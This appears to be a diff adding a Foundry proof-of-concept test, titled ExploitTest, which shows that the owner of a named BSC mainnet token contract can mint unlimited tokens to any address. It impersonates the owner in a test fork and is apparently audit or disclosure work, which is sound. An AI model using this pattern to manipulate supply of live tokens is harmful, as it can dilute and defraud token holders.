@@ -1,0 +1,52 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+
+interface ICoinToken {
+    function name() external view returns (string memory);
+    function symbol() external view returns (string memory);
+    function decimals() external view returns (uint256);
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address) external view returns (uint256);
+    function owner() external view returns (address);
+    function mint(address account, uint256 amount) external;
+    function transfer(address to, uint256 amount) external returns (bool);
+}
+
+contract ExploitTest is Test {
+    // Deployed contract on BSC mainnet
+    ICoinToken constant token = ICoinToken(0xF44DE2b8731cD69d4A727Da0214874aE35559426);
+
+    function setUp() public {
+        vm.label(address(token), "CoinToken");
+    }
+
+    function testOwnerCanMintTokens() public {
+        // Retrieve the current owner from the contract
+        address owner = token.owner();
+        vm.label(owner, "Owner");
+
+        uint256 initialSupply = token.totalSupply();
+        uint256 initialBalanceOwner = token.balanceOf(owner);
+
+        // Mint a large amount of tokens to the owner
+        uint256 mintAmount = 1_000_000 * 10**18; // 1 million tokens (assuming 18 decimals)
+        vm.prank(owner);
+        token.mint(owner, mintAmount);
+
+        // Assert total supply and owner balance increased by exactly mintAmount
+        assertEq(token.totalSupply(), initialSupply + mintAmount, "Total supply mismatch");
+        assertEq(token.balanceOf(owner), initialBalanceOwner + mintAmount, "Owner balance mismatch");
+
+        // Demonstrate arbitrary mint to any address (e.g., a victim)
+        address victim = address(0xDEAD);
+        vm.prank(owner);
+        token.mint(victim, 500_000 * 10**18);
+
+        assertEq(token.balanceOf(victim), 500_000 * 10**18, "Victim balance not set by mint");
+        assertEq(token.totalSupply(), initialSupply + mintAmount + 500_000 * 10**18, "Total supply after second mint");
+    }
+}
+```
